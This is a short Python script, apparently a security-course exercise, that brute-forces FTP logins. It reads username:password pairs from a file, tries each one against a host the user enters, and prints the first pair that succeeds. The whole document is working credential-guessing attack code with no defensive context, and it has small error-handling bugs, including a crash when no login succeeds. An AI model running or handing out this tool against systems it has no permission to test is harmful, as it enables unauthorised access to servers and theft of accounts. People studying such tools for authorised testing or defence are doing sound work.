#!/usr/bin/python3

import ftplib
from termcolor import colored


def bruteLogin(host, passfile):
    try:
        pF = open(passfile, "r")
    except:
        print(colored('[-] Failed to load the file.', 'red'))

    for line in pF.readlines():
        line = line.strip('\n')
        user = line.split(':')[0]
        passw = line.split(':')[1]

        print(f"[*] Trying: {user}/{passw}")

        try:
            ftp = ftplib.FTP(host)
            login = ftp.login(user, passw)
            print(colored(f'[+] Login Succeeded with {user}/{passw}', 'green'))
            ftp.quit()
            return (user, passw)
        except:
            pass

    print("[-] Login Failed.")


host = str(input(colored('[*] Enter the IP Address: ', 'blue')))
passfile = str(input(colored('[*] Enter the path of Password File: ', 'blue')))
creds = bruteLogin(host, passfile)
print(colored(f'[+] Credentials are {creds[0]}/{creds[1]}', 'green'))
